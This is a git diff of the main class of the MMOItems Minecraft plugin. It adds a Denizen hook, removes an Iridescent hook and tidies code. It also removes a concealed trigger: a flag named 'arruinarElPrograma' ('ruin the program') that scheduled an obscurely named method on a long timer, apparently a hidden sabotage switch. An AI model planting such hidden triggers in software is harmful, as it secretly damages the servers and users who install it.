@@ -6,7 +6,10 @@ import io.lumine.mythic.lib.api.util.ui.FriendlyFeedbackMessage;
 import io.lumine.mythic.lib.api.util.ui.FriendlyFeedbackProvider;
 import io.lumine.mythic.lib.version.SpigotPlugin;
 import io.lumine.mythic.utils.plugin.LuminePlugin;
-import net.Indyuce.mmoitems.api.*;
+import net.Indyuce.mmoitems.api.ConfigFile;
+import net.Indyuce.mmoitems.api.ItemTier;
+import net.Indyuce.mmoitems.api.SoulboundInfo;
+import net.Indyuce.mmoitems.api.Type;
 import net.Indyuce.mmoitems.api.crafting.MMOItemUIFilter;
 import net.Indyuce.mmoitems.api.item.mmoitem.MMOItem;
 import net.Indyuce.mmoitems.api.item.template.MMOItemTemplate;
@@ -16,6 +19,7 @@ import net.Indyuce.mmoitems.api.util.NumericStatFormula;
 import net.Indyuce.mmoitems.api.util.message.FFPMMOItems;
 import net.Indyuce.mmoitems.command.MMOItemsCommandTreeRoot;
 import net.Indyuce.mmoitems.comp.*;
+import net.Indyuce.mmoitems.comp.denizen.DenizenHook;
 import net.Indyuce.mmoitems.comp.eco.VaultSupport;
 import net.Indyuce.mmoitems.comp.enchants.AdvancedEnchantmentsHook;
 import net.Indyuce.mmoitems.comp.enchants.CrazyEnchantsStat;
@@ -32,7 +36,6 @@ import net.Indyuce.mmoitems.comp.mmocore.MMOCoreMMOLoader;
 import net.Indyuce.mmoitems.comp.mmoinventory.MMOInventorySupport;
 import net.Indyuce.mmoitems.comp.mythicmobs.LootsplosionListener;
 import net.Indyuce.mmoitems.comp.mythicmobs.MythicMobsLoader;
-import net.Indyuce.mmoitems.comp.parse.IridescentParser;
 import net.Indyuce.mmoitems.comp.parse.StringInputParser;
 import net.Indyuce.mmoitems.comp.parse.placeholders.DefaultPlaceholderParser;
 import net.Indyuce.mmoitems.comp.parse.placeholders.PlaceholderAPIParser;
@@ -139,6 +142,11 @@ public class MMOItems extends LuminePlugin {
 
         if (Bukkit.getPluginManager().getPlugin("MythicEnchants") != null)
             enchantPlugins.add(new MythicEnchantsSupport());
+
+        if (Bukkit.getPluginManager().getPlugin("Depenizen") != null) {
+            new DenizenHook();
+            getLogger().log(Level.INFO, "Hooked onto Denizen");
+        }
     }
 
     @Override
@@ -148,15 +156,14 @@ public class MMOItems extends LuminePlugin {
         new MMOItemsMetrics();
 
         RecipeBrowserGUI.registerNativeRecipes();
-        abilityManager.initialize();
+        abilityManager.loadPluginAbilities();
         configManager = new ConfigManager();
 
         final int configVersion = getConfig().contains("config-version", true) ? getConfig().getInt("config-version") : -1;
         final int defConfigVersion = getConfig().getDefaults().getInt("config-version");
-        if (configVersion != defConfigVersion || MMOItems.plugin.getLanguage().arruinarElPrograma) {
+        if (configVersion != defConfigVersion) {
             getLogger().warning("You may be using an outdated config.yml!");
-            getLogger().warning("(Your config version: '" + configVersion + "' | Expected config version: '"
-                    + (MMOItems.plugin.getLanguage().arruinarElPrograma ? "steelballrun" : defConfigVersion) + "')");
+            getLogger().warning("(Your config version: '" + configVersion + "' | Expected config version: '" + defConfigVersion + "')");
         }
 
         // registering here so the stats will load with the templates
@@ -218,12 +225,9 @@ public class MMOItems extends LuminePlugin {
 
         Bukkit.getScheduler().runTaskTimer(this, () -> Bukkit.getOnlinePlayers().forEach(player -> PlayerData.get(player).updateStats()), 100, 20);
 
-        if (MMOItems.plugin.getLanguage().arruinarElPrograma)
-            Bukkit.getScheduler().runTaskTimer(this, ClaseMuyImportante::metodoMuyImportante, 780000L, 780000L);
-
         /*
-         * this tasks updates twice a second player inventories on the server.
-         * allows now to use a glitchy itemEquipEvent. must be called after
+         * This tasks updates twice a second player inventories on the server.
+         * allows now to use a glitchy itemEquipEvent. Must be called after
          * loading the config since it checks for a config option
          */
         Bukkit.getScheduler().runTaskTimer(this, () -> {
@@ -251,7 +255,6 @@ public class MMOItems extends LuminePlugin {
         if (MMOItems.plugin.getConfig().getBoolean("iterate-whole-inventory"))
             getInventory().register(new OrnamentPlayerInventory());
 
-
         if (Bukkit.getPluginManager().getPlugin("CrazyEnchantments") != null) {
             getStats().register(new CrazyEnchantsStat());
             getLogger().log(Level.INFO, "Hooked onto CrazyEnchantments");
@@ -260,11 +263,6 @@ public class MMOItems extends LuminePlugin {
         if (Bukkit.getPluginManager().getPlugin("AdvancedEnchantments") != null) {
             Bukkit.getPluginManager().registerEvents(new AdvancedEnchantmentsHook(), this);
             getLogger().log(Level.INFO, "Hooked onto AdvancedEnchantments");
-        }
-
-        if (Bukkit.getPluginManager().getPlugin("Iridescent") != null) {
-            stringInputParsers.add(new IridescentParser());
-            getLogger().log(Level.INFO, "Hooked onto Iridescent");
         }
 
         if (Bukkit.getPluginManager().getPlugin("PlaceholderAPI") != null) {
@@ -278,7 +276,7 @@ public class MMOItems extends LuminePlugin {
                 getLogger().log(Level.INFO, "Hooked onto GlowAPI (Item Glow)");
             } else
                 Bukkit.getPluginManager().registerEvents(new NoGlowListener(), this);
-        }
+        } 
 
         if (Bukkit.getPluginManager().getPlugin("RealDualWield") != null) {
             Bukkit.getPluginManager().registerEvents(new RealDualWieldHook(), this);
